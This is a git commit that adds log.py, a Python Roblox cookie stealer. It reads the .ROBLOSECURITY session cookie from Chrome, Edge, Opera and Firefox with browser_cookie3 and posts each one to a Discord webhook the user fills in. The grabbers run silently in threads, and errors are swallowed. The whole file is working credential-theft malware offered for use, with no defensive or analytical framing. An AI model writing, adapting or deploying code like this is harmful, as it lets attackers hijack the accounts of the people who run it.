ad5361d2b3a5a441be093087edc3bf50236c00e4
IsaacDoesntDoStuff <90070921+IsaacDoesntDoStuff@users.noreply.github.com>
2022-09-16 18:37:20 -0400

    Create log.py

---
+++ log.py
@@ -0,0 +1,44 @@
+import browser_cookie3, requests, threading, discord_webhook                                                                                                                                                                                                                                                        
+
+webhook = 'YOUR WEBHOOK HERE'
+
+def chrome_logger():
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```COOKIE: {cookie}```'})
+    except:
+        pass
+        
+def edge_logger():
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+        
+def opera_logger():
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+        
+def firefox_logger():
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+    
+browsers = [chrome_logger, opera_logger, edge_logger, firefox_logger]
+
+for x in browsers:
+    threading.Thread(target=x,).start()
